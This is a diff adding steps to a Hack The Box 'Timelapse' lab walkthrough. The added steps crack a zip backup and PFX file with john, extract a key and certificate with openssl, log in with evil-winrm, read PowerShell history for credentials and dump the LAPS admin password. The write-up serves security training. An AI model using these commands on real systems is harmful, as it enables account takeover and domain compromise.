@@ -44,7 +44,35 @@ timelapse.htb
 dc1.timelapse.htb
 ```
 
+## Listing Shares
+
+![TimeLapse-shares](/HTB/Machines/images/TimeLapse-smbclient.png)
+
+## Shares Content
+
+![TimeLapse-share-content](/HTB/Machines/images/TimeLapse-Shares-share.png)
+
+![TimeLapse-discover-laps](/HTB/Machines/images/TimeLapse-discover-laps.png)
+
+## Zip Cracking
+
+```bash
+zip2john winrm_backup.zip > zip.hash
+
+john --format=PKZIP --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+```
+
+![TimeLapse-Zip-cracked](/HTB/Machines/images/TimeLapse-brute-wirmzip.png)
+
 ## PKCS cracking
+
+```bash
+pfx2john legacyy_dev_auth.pfx > pfx.hash
+```
+
+![TimeLapse-Pfx-cracked](/HTB/Machines/images/TimeLapse-brute-pfx.png)
+
+## PFX extract key and cert
 
 ```bash
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
@@ -52,17 +80,34 @@ openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
 openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
 ```
 
+![TimeLapse-pfx-get-key-cert](/HTB/Machines/images/TimeLapse-get-key-cert.png)
+
 ## evil-winrm connect with key and certificate
 
 ```bash
 evil-winrm -i $IP -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
 ```
 
+## Powershell readline history
+
+```pwsh
+cd C:\Users\legaccy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+type ConsoleHost_history.txt
+```
+
+![TimeLapse-PS-history](/HTB/Machines/images/TimeLapse-PS-history.png)
+
 ## LAPS
+
+```bash
+evil-winrm -i $IP -u svc-deploy -p <passwd>
+```
 
 ```pwsh
 Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 ```
+
+![laps-dump-admin-pwd](/HTB/Machines/images/TimeLapse-laps-dump-admin-pwd.png)
 
 ### references
 
